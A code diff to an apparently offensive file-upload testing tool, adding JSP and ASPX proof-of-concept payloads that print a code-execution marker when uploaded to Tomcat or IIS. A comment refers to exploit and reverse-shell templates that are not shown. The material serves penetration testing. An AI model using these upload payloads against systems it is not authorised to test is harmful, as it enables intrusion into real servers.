@@ -21,11 +21,17 @@ def _raw_deflate(data: bytes) -> bytes:
 # --------------------------------------------------------------------------- #
 # File-extension / comment syntax per language
 # --------------------------------------------------------------------------- #
-LANG_EXT = {"php": "php", "java": "java", "python": "py", "ruby": "rb", "nodejs": "js"}
+LANG_EXT = {"php": "php", "java": "java", "python": "py", "ruby": "rb",
+            "nodejs": "js", "jsp": "jsp", "aspx": "aspx"}
 
 # --------------------------------------------------------------------------- #
 # Payload templates.  PoC is harmless; exploit/revshell are gated behind
 # active profiles by the techniques that emit them.
+#
+# `jsp` and `aspx` use the server-side template syntax that Tomcat/Jasper and
+# IIS/ASP.NET actually execute on an uploaded file. A bare Java/C# *class*
+# saved with a .jsp/.aspx name is only served back as source, so those two
+# sinks previously emitted nothing that would run — see the Tomcat/IIS targets.
 # --------------------------------------------------------------------------- #
 POC = {
     "php": '<?php echo "upload-arsenal: code execution confirmed"; ?>',
@@ -34,6 +40,9 @@ POC = {
     "python": 'print("upload-arsenal: code execution confirmed")',
     "ruby": 'puts "upload-arsenal: code execution confirmed"',
     "nodejs": 'console.log("upload-arsenal: code execution confirmed");',
+    "jsp": '<% out.println("upload-arsenal: code execution confirmed"); %>',
+    "aspx": '<%@ Page Language="C#" %><% Response.Write('
+            '"upload-arsenal: code execution confirmed"); %>',
 }
 
 # Command-injection via a request parameter (active).
